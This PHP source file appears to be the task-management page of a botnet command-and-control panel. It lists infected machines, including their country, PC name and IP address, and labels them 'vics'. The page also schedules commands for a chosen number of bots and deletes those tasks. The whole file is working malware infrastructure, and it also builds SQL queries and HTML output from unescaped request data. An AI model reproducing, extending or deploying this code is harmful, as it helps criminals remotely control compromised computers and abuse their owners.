<?php
	class template_Tasks
	{
		private $Content = NULL;
		private $Title = 'Task Management';
		
		public function __construct()
		{
			global $FNC;
			global $DB;
			global $Commands;

			if(isset($_GET['new'])) { $this->newTask(); }
			elseif(isset($_GET['delete'])) { $this->deleteTask(intval($_GET['id'])) . $this->showList(); }
			elseif(intval($_GET['id'])) { $this->showID(intval($_GET['id'])); }
			else { $this->showList(); }

			$this->Content .= $FNC->Title("Commands");
			foreach($Commands as $Command=>$Desc) { $this->Content .= $FNC->Seperate('<b>' . $Command . '</b> - ' . $Desc); }
		}
		
		function showList() 
		{
			global $FNC;
			global $DB;
			$rTime = time();
			
			$Query = $DB->Query("SELECT t.*, (SELECT count(*) FROM bots WHERE taskID = t.taskID) AS vics, 
				(SELECT count(*) FROM tasks_done WHERE taskID = t.taskID) AS done FROM tasks AS t WHERE t.time <= '" . $rTime . 
					"' AND (t.elapsed > '" . $rTime . "' OR (t.elapsed = '0' AND (SELECT count(*) FROM tasks_done WHERE taskID = t.taskID) < t.bots))");
			
			$this->Content .= $FNC->Title("Current Tasks (" . $DB->numRows($Query) . ")");

			$Table = '<table><tr class="tr_title">
				<td>ID</td>
				<td>Command</td>
				<td>Start Time</td>
				<td>Run Until</td>
				<td>Bots</td>
				</tr>';
			
			while($sData = $DB->getRowArray($Query))
			{
				$Table .= '<tr><td>#' . $sData['taskID'] . '</td><td><a href="?q=tasks&id=' . $sData['taskID'] . '"><b>' . $sData['command'] . '</b></a></td><td>' . date("d.m.Y H:i", $sData['time']) . '</td><td>' . ($sData['elapsed'] > 0 ? date("d.m.Y H:i", $sData['elapsed']) : '&nbsp;') . '</td><td>' . ($sData['elapsed'] == 0 ? $sData['done'] . '/' : '') . $sData['bots'] . '</td></tr>';
			}
			
			$Table .= '</table><div style="text-align:right;padding:10px"><a href="?q=tasks&new" class="button"><span>New Task</span></a></div>';
			$this->Content .= $FNC->Content($Table);
			
			$Query = $DB->Query("SELECT t.*, (SELECT count(*) FROM bots WHERE taskID = t.taskID) AS vics, 
				(SELECT count(*) FROM tasks_done WHERE taskID = t.taskID) AS done FROM tasks AS t WHERE t.time > '" . $rTime . 
					"' OR (t.elapsed < '" . $rTime . "' AND t.elapsed != '0') OR (t.elapsed = '0' AND (SELECT count(*) FROM tasks_done WHERE taskID = t.taskID) >= t.bots)");
			
			if(!$DB->numRows($Query)) { return true; }
			$this->Content .= $FNC->Title("Future/Done Tasks (" . $DB->numRows($Query) . ")");

			$Table = '<table><tr class="tr_title">
				<td style="width:20px">&nbsp;</td>
				<td>Command</td>
				<td>Start Time</td>
				<td>Run Until</td>
				<td>Bots</td>
				</tr>';
			
			while($sData = $DB->getRowArray($Query)) 
			{
				$Table .= '<tr><td>#' . $sData['taskID'] . '</td><td><a href="?q=tasks&id=' . $sData['taskID'] . '"><b>' . $sData['command'] . '</b></a></td><td>' . date("d.m.Y H:i", $sData['time']) . '</td><td>' . ($sData['elapsed'] > 0 ? date("d.m.Y H:i", $sData['elapsed']) : '&nbsp;') . '</td><td>' . ($sData['elapsed'] == 0 ? $sData['done'] . '/' : '') . $sData['bots'] . '</td></tr>';
			}
			
			$Table .= '</table>';
			$this->Content .= $FNC->Content($Table);
		}
		
		function showID($iID)
		{
			global $FNC;
			global $DB;
			$rTime = time();
			
			$Query = $DB->Query("SELECT t.*, (SELECT count(*) FROM bots WHERE taskID = t.taskID) AS vics, 
				(SELECT count(*) FROM tasks_done WHERE taskID = t.taskID) AS done FROM tasks AS t WHERE t.taskID = '" . $iID . "'");
			
			$sData = $DB->getRowArray($Query);
			$this->Content .= $FNC->Title("Details");
			
			$Table = '<table>';
			$Table .= '<tr><td style="text-align:right;width:40%">Task ID:</td><td><b>' . $sData['taskID'] . '</b></td></tr>';
			$Table .= '<tr><td style="text-align:right;">Command:</td><td><b>' . $sData['command'] . '</b></td></tr>';
			$Table .= '<tr><td style="text-align:right;">Start Time:</td><td>' . date("d.m.Y H:i", $sData['time']) . '</td></tr>';
			if($sData['elapsed']) { $Table .= '<tr><td style="text-align:right;">End Time:</td><td>' . date("d.m.Y H:i", $sData['elapsed']) . '</td></tr>'; }
			$Table .= '<tr><td style="text-align:right;">Number of Bots:</td><td>' . $sData['bots'] . ' Bots</td></tr>';
			if(!$sData['elapsed']) { $Table .= '<tr><td style="text-align:right;">Done by:</td><td>' . $sData['done'] . ' Bots</td></tr>';}
			$Table .= '</table><div style="text-align:right;padding:10px"><a href="?q=tasks&delete&id=' . $sData['taskID'] . '" onclick="return confirm(\'Do you really want to delete this Task?\')" class="button"><span>Delete Task</span></a></div>';
			$this->Content .= $FNC->Content($Table);
			
			if($sData['elapsed']) 
			{
				$Query = $DB->Query("SELECT * FROM bots WHERE taskID = '" . $iID . "' AND Request > '" . ($rTime - BOT_TIME_ON) . "'");
				if(!$DB->numRows($Query)) { return false; }
				$this->Content .= $FNC->Title("Current Bots (" . $DB->numRows($Query) . ")");
			}
			else 
			{
				$Query = $DB->Query("SELECT v.* FROM tasks_done AS d LEFT JOIN bots AS v ON (v.ID = vicID) WHERE d.taskID = '" . $iID . "'");
				if(!$DB->numRows($Query)) { return false; }
				$this->Content .= $FNC->Title("Done by the following Bots (" . $DB->numRows($Query) . ")");
			}
			
			$Table = '<br /><table><tr class="tr_title">
				<td>ID</td>
				<td>Country</td>
				<td>PC Name</td>
				<td>Version</td>
				<td>IP</td>
				</tr>';
		
			while($sData = $DB->getRowArray($Query))
			{
				$Table .= '<tr><td>#' . $sData['ID'] . '</td><td><img src="resources/images/flags/' . $sData['Flag'] . '.gif" />&nbsp;' . $sData['Country'] . '</td><td>' . $sData['PCName'] . '</td><td>' . $sData['Version'] . '</td><td>' . $sData['IP'] . '</td></tr>';
			}
			
			$Table .= '</table>';
			$this->Content .= $FNC->Content($Table);
		}
		
		function deleteTask($iID) 
		{
			global $FNC;
			global $DB;
			
			$DB->Query("DELETE FROM tasks WHERE taskID = '" . $iID . "'");
			$DB->Query("DELETE FROM tasks_done WHERE taskID = '" . $iID . "'");
			$DB->Query("UPDATE bots SET taskID = '0' WHERE taskID = '" . $iID . "'");
			$this->Content .= $FNC->Content("Task successfully deleted!", "success");
		}
		
		function newTask()
		{
			global $FNC;
			global $DB;
			
			$this->Content .= $FNC->Title("New Task");
			
			if($_POST['submit'])
			{
				if($_POST['start']) 
				{
					list($Date, $Time) = explode(' ', trim($_POST['start']));
					$Date = explode('.', $Date);
					$Time = explode(':', $Time);
					$startTime = @mktime($Time[0], $Time[1], 0, $Date[1], $Date[0], $Date[2]);
				} else { $startTime = NULL; }
				
				if($_POST['end'])
				{
					list($Date, $Time) = explode(' ', trim($_POST['end']));
					$Date = explode('.', $Date);
					$Time = explode(':', $Time);
					$endTime = @mktime($Time[0], $Time[1], 0, $Date[1], $Date[0], $Date[2]);
				} else { $endTime = NULL; }
				
				if(!trim($_POST['command'])) { $this->Content .= $FNC->Content("<b>Error:</b><br />Command is not specified!", "error"); }
				elseif(trim($_POST['start']) != date("d.m.Y H:i", $startTime)) { $this->Content .= $FNC->Content("<b>Error:</b><br />Invalid start Time!", "error"); }
				elseif(intval($_POST['bots']) <= 0) { $this->Content .= $FNC->Content("<b>Error:</b><br />Invalid number of Bots or not specified!", "error"); }
				elseif($_POST['type'] != "once" && $_POST['type'] != "until") { $this->Content .= $FNC->Content("<b>Error:</b><br />Type of Task is not specified!", "error"); }
				elseif($_POST['type'] == "until" && trim($_POST['end']) != date("d.m.Y H:i", $endTime)) { $this->Content .= $FNC->Content("<b>Error:</b><br />Invalid end Time!", "error"); }
				else
				{
					$DB->Query("INSERT INTO tasks (time, elapsed, command, bots) VALUES ('" . $startTime . "', '" . ($_POST['type'] == "until" ? $endTime : 0) . "', '" . $DB->dRead($_POST['command']) . "', '" . intval($_POST['bots']) . "')");
					$this->Content .= $FNC->Content("Task successfully created!", "success");
					$this->Content .= $this->showID(mysql_insert_id());
					return true;
				}
			}
			
			$Table = '<form method="post" action="?q=tasks&new"><table>';
			$Table .= '<tr><td style="text-align:right">Command:</td><td><input type="text" name="command" value="' . $_POST['command'] . '"/></td></tr>';
			$Table .= '<tr><td style="text-align:right;">Start Time:</td><td><input type="text" name="start" value="' . ($_POST['start'] ? $_POST['start'] : date("d.m.Y H:i")) . '"></td></tr>';
			$Table .= '<tr><td style="text-align:right;">Number of Bots:</td><td><input type="text" name="bots" value="' . $_POST['bots'] . '"/></td></tr>';
			$Table .= '<tr><td>&nbsp;</td><td><input type="radio" value="once" name="type"' . ($_POST['type'] == "once" ? ' checked="checked"' : '') . '/> Run Once <input type="radio" value="until" name="type"' . ($_POST['type'] == "until" ? ' checked = "checked"' : '') . '/> Run Until</td></tr>';
			$Table .= '<tr><td style="text-align:right;">End Time:</td><td><input type="text" name="end" value="' . ($_POST['end'] ? $_POST['end'] : date("d.m.Y H:i")) . '"></td></tr>';
			$Table .= '<tr><td>&nbsp;</td><td style="text-align:right;padding-right:20px"><input type="submit" value="Create Task" name="submit" /></td></tr>';		
			$Table .= '</table></form>';
			$this->Content .= $FNC->Content($Table);
		}
		
		public function getContent()
		{
			return $this->Content;
		}
		
		public function getTitle()
		{
			return $this->Title;
		}
	}
?>